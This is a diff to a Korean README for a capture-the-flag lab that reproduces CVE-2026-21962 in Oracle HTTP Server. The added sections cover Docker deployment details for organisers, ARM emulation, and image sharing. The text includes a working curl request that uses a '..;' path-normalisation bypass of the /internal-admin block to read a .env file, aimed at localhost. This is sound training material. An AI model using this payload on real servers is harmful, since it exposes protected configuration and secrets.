@@ -3,6 +3,49 @@
 > 윈스테크넷 9기 CTF 3차 — 도커 환경 구축 / 배정 포트 **10008**
 > 대상: Oracle HTTP Server **12.2.1.4.0** (+ mod_wl_ohs 프록시 플러그인)
 
+## 배포 정보 (운영진용 — GZCTF 입력값)
+| 항목 | 값 |
+|------|-----|
+| 분류 | **공유(Shared)** — 읽기 전용 정보 노출(접근제어 우회), 서버 상태 변경 없음 |
+| 외부 포트 | **10008** (프론트 OHS) · 내부: 7777(OHS), 7101(backend) |
+| 이미지 | `cve-2026-21962-ohs-front`(외부 노출), `cve-2026-21962-backend`(내부 전용) |
+| 메모리 | 컨테이너당 256MB |
+| 플래그 | `WINS{...}` 형식, `GZCTF_FLAG` 또는 `FLAG` 환경변수 주입 (하드코딩 없음) |
+| ⚠️ 아키텍처 | **x86-64 전용** (OHS 설치본이 x86 only). ARM 서버에선 아래 QEMU 에뮬레이션으로 구동. |
+
+## ARM(Ampere) 서버 배포 — x86 에뮬레이션
+OHS(프론트)만 x86 전용이라 ARM 호스트에서 **QEMU 에뮬레이션**으로 돌립니다.
+공유 문제라 상시 컨테이너 1개뿐이라 부담이 작습니다. (백엔드는 ARM 네이티브로 동작)
+
+ARM 호스트에서 **1회만** QEMU 등록:
+```bash
+docker run --privileged --rm tonistiigi/binfmt --install amd64
+```
+이후 `docker compose up -d` 하면 compose의 `platform: linux/amd64` 설정대로 OHS가 에뮬레이션으로 구동됩니다.
+> 빌드도 ARM에서 하면 느리므로, x86 머신에서 빌드→`docker save`→ARM에서 `docker load` 가 더 빠릅니다.
+
+## 빠른 검증 — 미리 빌드한 이미지 사용 (Oracle 설치본 불필요)
+설치본이 없는 검증자/운영진은 **빌드한 이미지 .tar** 만 받으면 됩니다.
+
+**(A) 이미지 만드는 쪽 — 설치본 있는 x86 PC에서 1회:**
+```bash
+# Windows: set FLAG=WINS{test_1234}   /   Linux·mac: export FLAG=WINS{test_1234}
+docker compose up -d --build
+docker save -o cve-2026-21962-images.tar cve-2026-21962-ohs-front cve-2026-21962-backend
+```
+→ 생성된 `.tar`(용량 큼)를 팀 내부로 전달. ※ Oracle 소프트웨어 포함 → 공개 업로드 금지, 내부 공유만.
+
+**(B) 검증하는 쪽 — 설치본 없이:**
+```bash
+git clone https://github.com/2sangmin/Wins9_CVE_Practice.git
+cd Wins9_CVE_Practice
+docker load -i 경로/cve-2026-21962-images.tar
+# ARM 서버면 1회: docker run --privileged --rm tonistiigi/binfmt --install amd64
+set FLAG=WINS{test_1234}     # (Linux·mac: export FLAG=...)
+docker compose up -d         # --build 없이: load한 이미지 그대로 사용
+curl -i --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
+```
+
 ## 취약점 한 줄 요약
 OHS(프론트)와 백엔드가 `..;` 를 다르게 정규화해서, `<Location /internal-admin>` 차단을
 우회(`/foo/..;/internal-admin/cont/.env`)해 보호 리소스에 접근하는
